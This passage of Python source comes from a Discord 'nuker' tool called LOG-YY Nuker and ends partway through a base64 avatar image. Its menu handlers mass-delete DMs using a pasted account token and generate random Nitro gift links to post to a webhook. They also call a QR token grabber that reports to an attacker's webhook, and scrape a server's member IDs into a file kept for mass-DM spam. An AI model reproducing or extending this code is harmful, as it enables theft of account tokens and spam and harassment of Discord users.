    if choice == '24':
            Spinner()
            token = input(
            f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] Account Token : ')
            validateToken(token)
            processes = []
            channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
            if not channelIds:
                print(f"[\x1b[95m>>\x1b[95m\x1B[37m] This Token Has 0 Dms to Delete!")
                sleep(2)
                spammer()
            for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
                    t = threading.Thread(target=utilities.Plugins.DM_Deleter.DmDeleter, args=(token, channel))
                    t.start()
                    processes.append(t)
            for process in processes:
                process.join()
            input(f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] Press ENTER : ')



#   TOKEN GENERATOR
    if choice == '25':
        Spinner()
        gh = input(f"""
Token Generator is in the Paid Version of LOG-YY Nuker!\nIf You Are Wanting to Purchase Make Sure to Checkout the Offical LOG-YY Nuker Website!
                                   
[\x1b[95m1\x1b[95m\x1B[37m] LOG-YY Nuker Website
[\x1b[95m2\x1b[95m\x1B[37m] Exit
  
[\x1b[95m>>\x1b[95m\x1B[37m] Choice?: """)

        if gh in ['01','1']:
            webbrowser.open('https://gangnuker.com')
        elif gh in ['02','2']:
            exit = spammer()
        else:
         print('')



#   NITRO GENERATOR
    if choice == '26':
        Spinner()

        count = 0

        colorama.init(autoreset=True)
        link = input("\n[\x1b[95m>>\x1b[95m\x1B[37m] Webhook URL?: ")
        amount = int(input("[\x1b[95m>>\x1b[95m\x1B[37m] Amount of Nitro Codes?: "))
        for i in range(amount):
            time.sleep(1)
            code = "https://discord.gift/" + "".join(random.choices(string.ascii_letters + string.digits, k=16))
            count += 1
            print(f'{Fore.WHITE}[{Fore.GREEN}>>{Fore.WHITE}] Generated Nitro {count}')
            webhook = Webhook.from_url(link, adapter=RequestsWebhookAdapter())
            webhook.send(code)



#   QR TOKEN GRABBER
    elif choice == '27':
        WebHook = input(
            f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] Webhook URL: ')
        validateWebhook(WebHook)
        utilities.Plugins.QR_Grabber.QR_Grabber(WebHook)   



#   MEMBER ID SCRAPER
    if choice == '28':
            Spinner()
            tukan = input('\n[\x1b[95m>>\x1b[95m\x1B[37m] Account Token: ')
            guildd = input('[\x1b[95m>>\x1b[95m\x1B[37m] Server ID: ')
            chann = input('[\x1b[95m>>\x1b[95m\x1B[37m] Channel ID: ')
            bot = discum.Client(token=tukan)

            def closefetching(resp,guildid):
             if bot.gateway.finishedMemberFetching(guildid):
                lenmembersfetched = len(bot.gateway.session.guild(guildid).members)
                print(str(lenmembersfetched))
                bot.gateway.removeCommand({'function':closefetching, 'params':{'guildid':guildid}})
                bot.gateway.close()

            def getmembers(guildid,channelid):
                 bot.gateway.fetchMembers(guildid, channelid, keep='all',wait=1)
                 bot.gateway.command({'function':closefetching,'params':{'guildid':guildid}})
                 bot.gateway.run()
                 bot.gateway.resetSession()
                 return bot.gateway.session.guild(guildid).members

            members = getmembers(guildd, chann)

            memberids = []

            for memberId in members:
                memberids.append(memberId)

            cls()

            with open('utilities/QR/massdm_IDs.txt','w') as ids:
                for element in memberids:
                    ids.write(element + '\n')    

            print(f'\n[\x1b[{Fore.GREEN}>>{Fore.WHITE}\x1b[95m\x1B[37m] Finished Scraping {len(memberids)} members!\n(The members have already been put into the correct files for spamming!)')

            time.sleep(1)
            exit = input('\n[\x1b[95m>>\x1b[95m\x1B[37m] Press ENTER : ')
            exit = clear()
            exit = spammer()



#   PFP CHANGER
    if choice == '29':
        Spinner()
        global useragent
        def useragent():
                file = open('utilities/QR/useragent.txt','r')
                useragent = (random.choice(list(file)))
                useragent2 = []
                useragent2.append(useragent)
                useragent1 = []
        def randstr(lenn):
                alpha = "abcdefghijklmnopqrstuvwxyz0123456789"
                text = ''
                for i in range(0, lenn):
                    text += alpha[random.randint(0, len(alpha) - 1)]
                return text

        optionsforpfp = print(f'''
            [{Fore.LIGHTRED_EX}-{Fore.RESET}] These Options Can Lock Your Tokens!\n
            [\x1b[95m1\x1b[95m\x1B[37m] Single PFP
            [\x1b[95m2\x1b[95m\x1B[37m] Multiple PFP
            [\x1b[95m3\x1b[95m\x1B[37m] LOG-YY Nuker PFP\n''')
        optionsforpfp = int(input('[\x1b[95m>>\x1b[95m\x1B[37m] Choice?: '))

        if optionsforpfp == 1:
                    image = input('[\x1b[95m>>\x1b[95m\x1B[37m] Image Name?: ')
                    with open(image,'rb') as f:
                        byteform = base64.b64encode(f.read())
                        imageurl1 = byteform.decode('utf-8')

                    payload1 = {
                        'avatar':f'data:image/png;base64,{imageurl1}'
                    }

        elif optionsforpfp == 2:
                    path = input('[\x1b[95m>>\x1b[95m\x1B[37m] Directory For All The Images?: ')
                    path.replace(r'\\','\\\\')

                    image1 = random.choice([
                    x for x in os.listdir(path)
                    if os.path.isfile(os.path.join(path, x))
                ])

                    with open(image1,'rb') as e:
                        byteform = base64.b64encode(e.read())
                        imageurl2 = byteform.decode('utf-8')

                    payload2 = {
                        'avatar':f'data:image/png;base64,{imageurl2}'
                    }

        elif optionsforpfp == 3:
                    image = "data:image/jpeg;base64,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